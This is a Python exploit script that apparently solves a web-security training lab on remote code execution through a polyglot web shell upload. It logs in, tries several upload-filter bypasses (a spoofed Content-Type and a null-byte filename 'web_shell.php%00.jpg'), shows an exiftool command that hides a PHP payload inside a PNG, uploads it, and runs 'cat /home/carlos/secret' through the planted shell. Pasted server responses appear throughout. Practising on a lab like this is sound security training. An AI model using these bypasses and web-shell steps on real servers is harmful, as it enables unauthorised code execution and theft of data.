# Lab: Remote code execution via polyglot web shell upload

import requests
from pathlib import Path

cwd = Path(__file__).resolve().parent
webshell = cwd / "web_shell.php"

base = "https://0a12005a044d5387818b6bf200130050.web-security-academy.net"
user_session=requests.Session()

print("===========[step1] login with provided Credential===============")
r = user_session.get(f"{base}/login")   # this lab's login form may also carry a csrf token
login_data = {"username": "wiener", "password": "peter"}
if 'name="csrf"' in r.text:
    login_data["csrf"] = r.text.split('name="csrf" value="')[1].split('"')[0]
r = user_session.post(f"{base}/login", data=login_data)
print("login csrf:", login_data["csrf"])
print("status:", r.status_code)
print("body:", r.text)
'''
                        <form class=login-form id=avatar-upload-form action="/my-account/avatar" method=POST enctype="multipart/form-data">
                            <p>
                            <img src="/resources/images/avatarDefault.svg" class=avatar>
                            </p>
                            <label>Avatar:</label>
                            <input type=file name=avatar>
                            <input type=hidden name=user value=wiener />
                            <input required type="hidden" name="csrf" value="zvBF2WVpUynZDklmyeybkKAmPIPUyBLO">
                            <button class=button type=submit>Upload</button>
                        </form>
'''
user_info={}
if 'name="csrf"' in r.text:
    user_info["csrf"]=r.text.split('name="csrf" value="')[1].split('"')[0]

print("===========[step2] Upload Web Shell===============")
files = {
    "avatar": ("web_shell.php", open(webshell, "rb"), "application/x-php")
}
# form name ↑  ↑ filename to send server  ↑ file content(binary)  ↑ Content-Type
data = {"user": "wiener", "csrf": user_info["csrf"]}

r = user_session.post(f"{base}/my-account/avatar", files=files, data=data)
print("status:", r.status_code)
print("body:", r.text)

'''
status: 403
body: Error: file is not a valid image
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>
'''

print("===========[step2-1] Upload Web Shell===============")
files = {
    "avatar": ("web_shell.php", open(webshell, "rb"), "image/jpeg")
}
# form name ↑  ↑ filename to send server  ↑ file content(binary)  ↑ Content-Type
data = {"user": "wiener", "csrf": user_info["csrf"]}

r = user_session.post(f"{base}/my-account/avatar", files=files, data=data)
print("status:", r.status_code)
print("body:", r.text)

'''
status: 403
status: 403
body: Error: file is not a valid image
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>
'''

print("===========[step2-2] Upload Web Shell===============")
files = {
    "avatar": ("web_shell.php%00.jpg", open(webshell, "rb"), "image/jpeg")
}
# form name ↑  ↑ filename to send server  ↑ file content(binary)  ↑ Content-Type
data = {"user": "wiener", "csrf": user_info["csrf"]}

r = user_session.post(f"{base}/my-account/avatar", files=files, data=data)
print("status:", r.status_code)
print("body:", r.text)

'''
status: 403
body: Error: file is not a valid image
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>
'''


'''
PS C:\> exiftool "-Comment<=payload.txt" test.png -o polyglot.php
    1 image files created
'''

print("===========[step2-3] Upload Web Shell===============")
files = {
    "avatar": ("polyglot.php", open(cwd / "polyglot.php", "rb"), "image/png")
}
# form name ↑  ↑ filename to send server  ↑ file content(binary)  ↑ Content-Type
data = {"user": "wiener", "csrf": user_info["csrf"]}

r = user_session.post(f"{base}/my-account/avatar", files=files, data=data)
print("status:", r.status_code)
print("body:", r.text)



print("===========[step3] Aceess to my-account again===============")
r = user_session.get(f"{base}/my-account", params={"id": data["user"]}, allow_redirects=False)
print("status:", r.status_code)
print("body:", r.text)
'''
                        <form class=login-form id=avatar-upload-form action="/my-account/avatar" method=POST enctype="multipart/form-data">
                            <p>
                            <img src="/resources/images/avatarDefault.svg" class=avatar>
                            </p>
                            <label>Avatar:</label>
                            <input type=file name=avatar>
                            <input type=hidden name=user value=wiener />
                            <input required type="hidden" name="csrf" value="xfvmuXFgRk26ZDWAj9MjENjrXJlunYoA">
                            <button class=button type=submit>Upload</button>
                        </form>
'''

print("===========[step4] Execute Web Shell===============")
shell_url = f"{base}/files/avatars/polyglot.php"
r = user_session.get(shell_url, params={"cmd": "cat /home/carlos/secret"})
print("secret:", r.text.split("START ")[1].split(" END")[0])
